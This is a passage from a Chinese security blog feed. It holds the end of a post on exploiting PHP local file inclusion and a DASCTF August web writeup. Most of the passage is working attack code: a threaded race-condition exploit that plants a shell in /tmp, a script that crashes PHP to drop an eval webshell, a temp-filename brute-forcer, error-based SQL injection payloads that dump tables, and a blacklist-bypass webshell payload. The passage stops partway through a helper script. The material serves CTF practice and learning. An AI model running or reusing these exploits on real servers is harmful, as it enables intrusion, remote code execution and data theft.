socket.SOCK_STREAM)</span><br><span class="line">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    s2.connect((host, port))</span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    d = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> len(d) &lt; offset:</span><br><span class="line">        d += s.recv(offset)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = d.index(<span class="string">&quot;[tmp_name] =&amp;gt&quot;</span>)</span><br><span class="line">        fn = d[i+17:i+31]</span><br><span class="line">        <span class="comment"># print fn</span></span><br><span class="line">    except ValueError:</span><br><span class="line">        <span class="keyword">return</span> None</span><br><span class="line"></span><br><span class="line">    s2.send(lfireq % (<span class="function"><span class="keyword">fn</span>, <span class="title">host</span>))</span></span><br><span class="line"><span class="function">    <span class="title">d</span> = <span class="title">s2</span>.<span class="title">recv</span>(<span class="params"><span class="number">4096</span></span>)</span></span><br><span class="line"><span class="function">    <span class="title">s</span>.<span class="title">close</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    <span class="title">s2</span>.<span class="title">close</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    <span class="title">if</span> <span class="title">d</span>.<span class="title">find</span>(<span class="params">tag</span>) != -1:</span></span><br><span class="line"><span class="function">        <span class="title">return</span> <span class="title">fn</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">counter</span>=0</span></span><br><span class="line"><span class="function"><span class="title">class</span> <span class="title">ThreadWorker</span>(<span class="params">threading.Thread</span>):</span></span><br><span class="line"><span class="function">    <span class="title">def</span> <span class="title">__init__</span>(<span class="params"><span class="built_in">self</span>, e, l, m, *args</span>):</span></span><br><span class="line"><span class="function">        <span class="title">threading</span>.<span class="title">Thread</span>.<span class="title">__init__</span>(<span class="params"><span class="built_in">self</span></span>)</span></span><br><span class="line"><span class="function">        <span class="title">self</span>.<span class="title">event</span> = <span class="title">e</span></span></span><br><span class="line"><span class="function">        <span class="title">self</span>.<span class="title">lock</span> = <span class="title">l</span></span></span><br><span class="line"><span class="function">        <span class="title">self</span>.<span class="title">maxattempts</span> = <span class="title">m</span></span></span><br><span class="line"><span class="function">        <span class="title">self</span>.<span class="title">args</span> = <span class="title">args</span></span></span><br><span class="line"><span class="function">    <span class="title">def</span> <span class="title">run</span>(<span class="params"><span class="built_in">self</span></span>):</span></span><br><span class="line"><span class="function">        <span class="title">global</span> <span class="title">counter</span></span></span><br><span class="line"><span class="function">        <span class="title">while</span> <span class="title">not</span> <span class="title">self</span>.<span class="title">event</span>.<span class="title">is_set</span>(<span class="params"></span>):</span></span><br><span class="line"><span class="function">            <span class="title">with</span> <span class="title">self</span>.<span class="title">lock</span>:</span></span><br><span class="line"><span class="function">                <span class="title">if</span> <span class="title">counter</span> &gt;= <span class="title">self</span>.<span class="title">maxattempts</span>:</span></span><br><span class="line"><span class="function">                    <span class="title">return</span></span></span><br><span class="line"><span class="function">                <span class="title">counter</span>+=1</span></span><br><span class="line"><span class="function">            <span class="title">try</span>:</span></span><br><span class="line"><span class="function">                <span class="title">x</span> = <span class="title">phpInfoLFI</span>(<span class="params">*<span class="built_in">self</span>.args</span>)</span></span><br><span class="line"><span class="function">                <span class="title">if</span> <span class="title">self</span>.<span class="title">event</span>.<span class="title">is_set</span>(<span class="params"></span>):</span></span><br><span class="line"><span class="function">                    <span class="title">break</span></span></span><br><span class="line"><span class="function">                <span class="title">if</span> <span class="title">x</span>:</span></span><br><span class="line"><span class="function">                    <span class="title">print</span> &quot;<span class="title">nGot</span> <span class="title">it</span>! <span class="title">Shell</span> <span class="title">created</span> <span class="title">in</span> /<span class="title">tmp</span>/<span class="title">g</span>&quot;</span></span><br><span class="line"><span class="function">                    <span class="title">self</span>.<span class="title">event</span>.<span class="title">set</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">            <span class="title">except</span> <span class="title">socket</span>.<span class="title">error</span>:</span></span><br><span class="line"><span class="function">                <span class="title">return</span></span></span><br><span class="line"><span class="function"><span class="title">def</span> <span class="title">getOffset</span>(<span class="params">host, port, phpinforeq</span>):</span></span><br><span class="line"><span class="function">    &quot;&quot;&quot;<span class="title">Gets</span> <span class="title">offset</span> <span class="title">of</span> <span class="title">tmp_name</span> <span class="title">in</span> <span class="title">the</span> <span class="title">php</span> <span class="title">output</span>&quot;&quot;&quot;</span></span><br><span class="line"><span class="function">    <span class="title">s</span> = <span class="title">socket</span>.<span class="title">socket</span>(<span class="params">socket.AF_INET, socket.SOCK_STREAM</span>)</span></span><br><span class="line"><span class="function">    <span class="title">s</span>.<span class="title">connect</span>(<span class="params">(<span class="params">host,port</span>)</span>)</span></span><br><span class="line"><span class="function">    <span class="title">s</span>.<span class="title">send</span>(<span class="params">phpinforeq</span>)</span></span><br><span class="line"><span class="function">    <span class="title">d</span> = &quot;&quot;</span></span><br><span class="line"><span class="function">    <span class="title">while</span> <span class="title">True</span>:</span></span><br><span class="line"><span class="function">        <span class="title">i</span> = <span class="title">s</span>.<span class="title">recv</span>(<span class="params"><span class="number">4096</span></span>)</span></span><br><span class="line"><span class="function">        <span class="title">d</span>+=<span class="title">i</span></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="title">i</span> == &quot;&quot;:</span></span><br><span class="line"><span class="function">            <span class="title">break</span></span></span><br><span class="line"><span class="function">        # <span class="title">detect</span> <span class="title">the</span> <span class="title">final</span> <span class="title">chunk</span></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="title">i</span>.<span class="title">endswith</span>(<span class="params"><span class="string">&quot;0rnrn&quot;</span></span>):</span></span><br><span class="line"><span class="function">            <span class="title">break</span></span></span><br><span class="line"><span class="function">    <span class="title">s</span>.<span class="title">close</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    <span class="title">i</span> = <span class="title">d</span>.<span class="title">find</span>(<span class="params"><span class="string">&quot;[tmp_name] =&amp;gt&quot;</span></span>)</span></span><br><span class="line"><span class="function">    <span class="title">if</span> <span class="title">i</span> == -1:</span></span><br><span class="line"><span class="function">        <span class="title">raise</span> <span class="title">ValueError</span>(<span class="params"><span class="string">&quot;No php tmp_name in phpinfo output&quot;</span></span>)</span></span><br><span class="line">    print &quot;found %s at %i&quot; % (d[i:i+10],i)</span><br><span class="line">    <span class="comment"># padded up a bit</span></span><br><span class="line">    <span class="keyword">return</span> i+<span class="number">256</span></span><br><span class="line">def main():</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;LFI With PHPInfo()&quot;</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;-=&quot;</span> * <span class="number">30</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Usage: %s host [port] [threads]&quot;</span> % sys.argv[<span class="number">0</span>]</span><br><span class="line">        sys.<span class="keyword">exit</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        host = socket.gethostbyname(sys.argv[<span class="number">1</span>])</span><br><span class="line">    except socket.<span class="built_in">error</span>, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Error with hostname %s: %s&quot;</span> % (sys.argv[<span class="number">1</span>], e)</span><br><span class="line">        sys.<span class="keyword">exit</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    port=<span class="number">80</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        port = <span class="keyword">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line">    except IndexError:</span><br><span class="line">        pass</span><br><span class="line">    except ValueError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Error with port %d: %s&quot;</span> % (sys.argv[<span class="number">2</span>], e)</span><br><span class="line">        sys.<span class="keyword">exit</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    poolsz=<span class="number">10</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        poolsz = <span class="keyword">int</span>(sys.argv[<span class="number">3</span>])</span><br><span class="line">    except IndexError:</span><br><span class="line">        pass</span><br><span class="line">    except ValueError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Error with poolsz %d: %s&quot;</span> % (sys.argv[<span class="number">3</span>], e)</span><br><span class="line">        sys.<span class="keyword">exit</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Getting initial offset...&quot;</span>,</span><br><span class="line">    reqphp, tag, reqlfi = setup(host, port)</span><br><span class="line">    offset = getOffset(host, port, reqphp)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    maxattempts = <span class="number">1000</span></span><br><span class="line">    e = threading.Event()</span><br><span class="line">    l = threading.Lock()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Spawning worker pool (%d)...&quot;</span> % poolsz</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    tp = []</span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">0</span>,poolsz):</span><br><span class="line">        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))</span><br><span class="line">    <span class="keyword">for</span> t in tp:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> not e.wait(<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> e.is_set():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            with l:</span><br><span class="line">                sys.stdout.write( <span class="string">&quot;r% 4d / % 4d&quot;</span> % (counter, maxattempts))</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= maxattempts:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">print</span></span><br><span class="line">        <span class="keyword">if</span> e.is_set():</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&quot;Woot! m/&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&quot;:(&quot;</span></span><br><span class="line">    except KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;nTelling threads to shutdown...&quot;</span></span><br><span class="line">        e.set()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Shuttin&#x27; down...&quot;</span></span><br><span class="line">    <span class="keyword">for</span> t in tp:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="with-php崩溃">with php崩溃</h2><h3 id="php-segfault">php segfault</h3><p>向PHP发送含有文件区块的数据包时，让PHP异常崩溃退出，POST的临时文件就会被保留</p><p><strong>1. php &lt; 7.2</strong></p><p><code>php://filter/string.strip_tags/resource=/etc/passwd</code></p><p><strong>2. php7 老版本通杀</strong></p><p><code>php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA</code></p><p>利用脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># php崩溃 生成大量临时文件</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import <span class="keyword">string</span></span><br><span class="line"></span><br><span class="line">def upload_file(url, file_content):</span><br><span class="line">    files = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;test.jpg&#x27;</span>, file_content, <span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.post(url, files=files)</span><br><span class="line">    except <span class="built_in">Exception</span> <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> e</span><br><span class="line"></span><br><span class="line">charset = <span class="keyword">string</span>.digits+<span class="keyword">string</span>.letters</span><br><span class="line">webshell = <span class="string">&#x27;&lt;?php eval($_REQUEST[daolgts]);?&gt;&#x27;</span>.encode(<span class="string">&quot;base64&quot;</span>).strip()</span><br><span class="line">file_content = <span class="string">&#x27;&lt;?php if(file_put_contents(&quot;/tmp/daolgts&quot;, base64_decode(&quot;%s&quot;)))&#123;echo &quot;success&quot;;&#125;?&gt;&#x27;</span> % (webshell)</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;&quot;</span></span><br><span class="line">parameter=<span class="string">&quot;&quot;</span></span><br><span class="line">payload1=<span class="string">&quot;php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line">payload2=r<span class="string">&quot;php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span></span><br><span class="line">lfi_url = url+<span class="string">&quot;?&quot;</span>+parameter+<span class="string">&quot;=&quot;</span>+payload1</span><br><span class="line">length = <span class="number">6</span></span><br><span class="line">times = len(charset) ** (length / <span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i in xrange(times):</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;[+] %d / %d&quot;</span> % (i, times)</span><br><span class="line">    upload_file(lfi_url, file_content)</span><br></pre></td></tr></table></figure><h3 id="爆破tmp文件名">爆破tmp文件名</h3><p>然后爆破临时文件名来包含</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">charset = string.digits + string.letters</span><br><span class="line">base_url=<span class="string">&quot;&quot;</span></span><br><span class="line">parameter=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> charset:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> charset:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> charset:</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> charset:</span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> charset:</span><br><span class="line">                    <span class="keyword">for</span> n <span class="keyword">in</span> charset:</span><br><span class="line">                        filename = i + j + k + l + m + n</span><br><span class="line">                        url = base_url+<span class="string">&quot;?&quot;</span>+parameter+<span class="string">&quot;=/tmp/php&quot;</span>+filename</span><br><span class="line">                        <span class="keyword">print</span> url</span><br><span class="line">                        <span class="keyword">try</span>:</span><br><span class="line">                            response = requests.get(url)</span><br><span class="line">                            <span class="keyword">if</span> <span class="string">&#x27;success&#x27;</span> <span class="keyword">in</span> response.content:</span><br><span class="line">                                <span class="keyword">print</span> <span class="string">&quot;[+] Include success!&quot;</span></span><br><span class="line">                                <span class="keyword">print</span> <span class="string">&quot;url:&quot;</span>+url</span><br><span class="line">                                exit()</span><br><span class="line">                        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                            <span class="keyword">print</span> e</span><br></pre></td></tr></table></figure><h2 id="session">session</h2><p><strong>利用条件</strong></p><p>session文件路径已知，且其中内容部分可控。</p><p><strong>利用方式</strong></p><blockquote><p>当一个上传在处理中，同时POST一个与INI中设置的<code>session.upload_progress.name</code>同名变量时，上传进度可以在<code>$_SESSION</code>中获得。 当PHP检测到这种POST请求时，它会在<code>$_SESSION</code>中添加一组数据, 索引是 <code>session.upload_progress.prefix</code>与<code>session.upload_progress.name</code>连接在一起的值。</p></blockquote><p>也就是说session中会添加<code>session.upload_progress.prefix</code>+<code>$_POST[ini_get['session.upload_progress.name']]</code>,而<code>session.upload_progress.name</code>是可控的，所以就可以在session写入php代码，然后包含session文件来rce</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;PHP-LFI利用总结&quot;&gt;PHP LFI利用总结&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;参考文章：&lt;a href=&quot;https://www.anquanke.com/post/id/177491&quot;&gt;https://www.anquanke.com/post/i
      
    
    </summary>
    
    
      <category term="web安全" scheme="http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="基础学习" scheme="http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="web安全基础" scheme="http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF八月赛WP</title>
    <link href="http://ca0y1h.top/Web_security/ctf_writeup/23.DASCTF2020%E5%85%AB%E6%9C%88%E8%B5%9B/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/23.DASCTF2020%E5%85%AB%E6%9C%88%E8%B5%9B/</id>
    <published>2020-09-05T11:53:18.000Z</published>
    <updated>2020-09-07T01:02:34.820Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DASCTF八月赛-Web-Writeup">DASCTF八月赛 Web Writeup</h1><h2 id="安恒大学">安恒大学</h2><h3 id="考点">考点</h3><ul><li>渗透测试</li><li>SQL报错注入</li></ul><h3 id="解题">解题</h3><p>y1ng师傅出的一道题，非常顶，可以说是这是一道实战改编题，y1ng师傅在做渗透测试时，在一个系统的某个不起眼的地方——邮件激活链接发现了SQL注入，并得到了全校所有学生的内网平台账号密码，而学生的所有信息、所有网上办事等等几乎都使用校内网平台的账号密码。</p><p>其实比赛的时候主办方也提醒了邮箱不要随便填，不过当时还是没能察觉到邮件激活链接中的一个参数存在SQL注入。</p><p>现在正式解题，直接看邮件激活链接：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;183.129.189.60:10048&#x2F;doAction.php?act&#x3D;active&amp;username&#x3D;ca01h&amp;token&#x3D;cf42313ae7812e9234d5b378f095e688</span><br></pre></td></tr></table></figure><p>注入点在username参数，说一下我的解题过程：</p><p>首先使SQL语句报错</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200905200253.png" alt=""></p><p>再尝试万能注入payload：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200905200602.png" alt=""></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/image-20200905200658101.png" alt=""></p><p>好像可以使用盲注，再尝试<code>ca01h2' or if(length(select database())&gt;1, 1, 0)--+</code>，结果直接SQL语句报错</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200905200842.png" alt=""></p><p>盲注不行，联合注入被过滤，那么接着试一下报错注入：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200905200951.png" alt=""></p><p>成功爆出当前用户名，接下来的工作就是拿数据。</p><p>爆表名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ca01h2&#39; and (extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),0x7e)))--+</span><br></pre></td></tr></table></figure><p>一共有三个表：<code>student, teachers, users</code></p><p>爆列名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ca01h2&#39; and (extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;&#39;student&#39; limit 0,1),0x7e)))--+</span><br></pre></td></tr></table></figure><p>student表一共四个字段：<code>id, username, age, sex</code></p><p>teachers表：<code>id, f1aaaag, </code></p><p>爆数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ca01h2&#39; and (extractvalue(1,concat(0x7e,(select reverse(f1aaaag) from teachers limit 11,1),0x7e)))--+</span><br></pre></td></tr></table></figure><h2 id="rceme">rceme</h2><h3 id="考点-v2">考点</h3><ul><li>无字母数字webshell</li></ul><h3 id="解题-v2">解题</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$code=$_POST[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">$_=<span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;@&#x27;</span>,<span class="string">&#x27;\~&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\&amp;&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"><span class="comment">//This blacklist is so stupid.</span></span><br><span class="line">$blacklist = array_merge($_);</span><br><span class="line"><span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blacklisted) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">&#x27;/&#x27;</span> . $blacklisted . <span class="string">&#x27;/im&#x27;</span>, $code)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;you are not smart&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$code</span>)&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过滤了所有字母数字和部分逻辑运算符以及常用于构造webshell的<code>^</code>、<code>~</code>、<code>&amp;</code>等符号。</p><p>但是还有一个逻辑运算符放出来了 <code>|</code>或运算。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200905222802.png" alt=""></p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code&#x3D;(&#39;&#96;&#96;&#96;&#96;&#96;&#96;&#96;&#96;&#39;|&#39;&#39;)(&#39;&#x2F;&#96;&#96;&#96;&#96;&#39;|&#39;&#x2F;&#39;));&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p>应该是可以用python脚本fuzz出来的。</p><p>y1ng师傅的方法，直接不用或运算符，TQLLLLLL，代码看不太懂，膜就完事。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#__author__: 颖奇L&#x27;Amore www.gem-love.com</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote_plus</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">g</span>(<span class="params">payload, buff</span>):</span></span><br><span class="line">offset = <span class="number">3</span> + buff</span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line">base = <span class="number">65</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(payload)):</span><br><span class="line"><span class="keyword">if</span> payload[i] == <span class="string">&#x27;_&#x27;</span> <span class="keyword">or</span> payload[i] == <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">_ascii = ord(payload[i])</span><br><span class="line"><span class="comment">#init</span></span><br><span class="line">underline =  <span class="string">&quot;$&quot;</span> + (<span class="string">&quot;_&quot;</span> * (i + offset))</span><br><span class="line">undefined = <span class="string">&quot;$&quot;</span> + (<span class="string">&quot;_&quot;</span> * (len(payload) + offset + <span class="number">15</span>))</span><br><span class="line">var = <span class="string">f&quot;++<span class="subst">&#123;underline&#125;</span>;$__-=<span class="subst">&#123;underline&#125;</span>;$__++;<span class="subst">&#123;underline&#125;</span>/=$__;<span class="subst">&#123;underline&#125;</span>=((<span class="subst">&#123;undefined&#125;</span>/<span class="subst">&#123;undefined&#125;</span>).<span class="subst">&#123;underline&#125;</span>)&quot;</span>+<span class="string">r&quot;&#123;++$__&#125;;$__--;&quot;</span></span><br><span class="line">res += var;</span><br><span class="line">tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> _ascii &gt; base:</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(_ascii-base):</span><br><span class="line">tmp = tmp + <span class="string">f&quot;++<span class="subst">&#123;underline&#125;</span>;&quot;</span></span><br><span class="line">res += tmp</span><br><span class="line"></span><br><span class="line">first =  <span 